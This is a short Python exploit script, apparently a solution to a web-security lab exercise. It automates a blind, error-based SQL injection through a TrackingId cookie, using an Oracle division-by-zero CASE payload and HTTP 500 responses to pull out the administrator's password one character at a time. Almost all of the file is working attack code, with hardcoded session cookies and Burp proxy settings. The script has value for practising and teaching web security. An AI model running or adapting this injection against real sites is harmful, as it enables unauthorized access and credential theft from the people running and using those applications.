import sys
import requests
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sql_payload  = " '||(select CASE WHEN (1=1) THEN to_Char(1/0) ELSE '' END from users where username='administrator' and ascii(substr(password,%s,1))='%s')||'" % (i,j)

            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId':'9AwQGz5SGvEkCiQY'+sql_payload_encoded, 'session':'xNrW8dJK100CyNQmGFmlE3R07AUg2BF3'}
            r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password.....")
    sqli_password(url)


if __name__ == "__main__":
    main()